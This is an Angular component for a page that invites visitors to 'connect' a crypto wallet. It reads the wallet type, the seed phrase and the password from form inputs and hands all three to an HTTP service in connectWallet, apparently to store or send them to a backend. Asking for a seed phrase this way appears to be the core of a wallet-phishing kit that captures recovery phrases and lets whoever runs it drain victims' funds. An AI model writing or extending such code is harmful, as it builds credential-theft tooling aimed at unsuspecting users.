import { Component, OnInit } from '@angular/core';
import { timeStamp } from 'console';

import { AngularFirestore } from '@angular/fire/compat/firestore';
import { HttpService } from 'src/app/services/http.service';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.scss']
})
export class HomeComponent implements OnInit {

  selectedWallet: string = '';
  seedPhraseText: string = '';
  passwordText: string = '';

  constructor(private httpService: HttpService) { }

  ngOnInit(): void {
  }

  selectWallet(selectedWallet :string) {
    this.selectedWallet = selectedWallet;
  }

  getSeedPhrase(event: any) {
    this.seedPhraseText = event.target.value;
  }

  getPassword(event: any) {
    this.passwordText = event.target.value;
  }

  connectWallet() {
    const dataTooSend = {
      wallet: this.selectedWallet,
      seedPhrase: this.seedPhraseText,
      password: this.passwordText
    }
    this.httpService.create(dataTooSend);
  }

}
